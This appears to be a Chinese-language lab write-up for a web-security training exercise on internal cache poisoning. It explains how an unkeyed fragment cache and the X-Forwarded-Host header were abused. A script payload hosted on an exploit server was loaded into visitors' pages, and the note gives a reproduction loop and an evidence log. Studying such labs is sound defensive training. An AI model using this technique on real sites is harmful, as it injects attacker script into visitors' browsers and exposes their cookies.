---
title: "lab-web-cache-poisoning-internal"
links:
  - target: cache-poisoning-family
    relation: evidences
---

# lab-web-cache-poisoning-internal

> evidences: [[cache-poisoning-family]]

- 题面:Internal cache poisoning(/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal)
- 实例(批36):https://0a6d006e0443f834814f2f51003300de.web-security-academy.net
- 利用服务器(随实例变):https://exploit-0aff003e049af89a81922e22011d0087.exploit-server.net
- 判定目标:投毒**内部缓存**,使访客首页执行 `alert(document.cookie)`;状态:**solved**(横幅 `Congratulations, you solved the lab!`)

## 机制

**内部缓存 = 一个"片段(fragment)缓存",无键、跨页面共享。** 片段内容(首页/文章页 head 里同一行):

```html
<script src=//<X-Forwarded-Host 或 Host>/js/geolocate.js?callback=loadCountry></script><script>trackingID='<随机串>'</script>
```

- `analytics.js` 的 src(和 canonical)是**每请求**由 `X-Forwarded-Host`(缺省=Host)生成的 → 不是片段,毒它没用。
- `geolocate.js` 的 src + `trackingID` 是**片段**:一次渲染写入后,后续**任何路径**的渲染都复用它(实测:`/post?postId=6`、`/?a=1`、`/post?postId=7` 三页拿到同一个 trackingID 与同一段 src)。
- 片段 TTL 约 30s 量级;过期后由下一次渲染用**该请求的 Host/XFH** 重写。

## 链(收口)

1. 利用服务器 STORE:`responseFile=/js/geolocate.js`,`responseBody=alert(document.cookie)`,
   `responseHead=HTTP/1.1 200 OK\nContent-Type: application/javascript; charset=utf-8`(MIME 必须是 JS)。
2. 反复发 `GET /?cb=<递增>` + `X-Forwarded-Host: <exploit-server>`:
   **cache-buster 必需**——否则页面缓存命中,后端不重渲染,片段就不会被重写。
   新件 `poison_loop --bust cb`(v1.1.0)即为此用。
3. 片段被写成 `//exploit-...exploit-server.net/js/geolocate.js?callback=loadCountry` → 访客首页(或任何页)加载它 → `alert(document.cookie)`。
4. 同时我的无 XFH 的 `GET /` 会把**带毒的首页**写进页面缓存(键 `/`),访客直接吃这条更稳。

## 证据摘录

```
GET /?cb=x1 + XFH: XQZMARK.example  -> 200, src=//XQZMARK.example/js/geolocate.js?callback=loadCountry
GET /post?postId=1&cb=x2 (无 XFH)    -> src 仍是 //XQZMARK.example/js/geolocate.js  (片段共享!)
GET / (无 XFH)                       -> src=//exploit-0aff.../js/geolocate.js   (投毒态首页)
solved_check /?solvedcheck=1         -> solved=true, congrats_line="Congratulations, you solved the lab!"
```

## 复现命令

```
lab_http post "<exploit>/" --form urlIsHttps=on --form responseFile=/js/geolocate.js \
  --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: application/javascript; charset=utf-8' \
  --form 'responseBody=alert(document.cookie)' --form formAction=STORE
poison_loop "<inst>/" --header 'X-Forwarded-Host: <exploit-host>' --interval-secs 1 --count 300 --bust cb   # 后台跑
solved_check "<inst>/?solvedcheck=1"
```

## 交册值(可迁移)

- **判"内部片段缓存"的方法**:同一页面的两处 Host 派生输出表现不一致——一处(analytics/canonical)逐请求变,另一处(geolocate src)在所有页面上恒定 = 片段;
  或"从未投毒过的页面也带着你上一个请求的值"。
- **投毒片段必须用 cache-buster 循环**:页面缓存命中时后端不渲染,片段不会重写(这是批9 未收口的真正原因)。
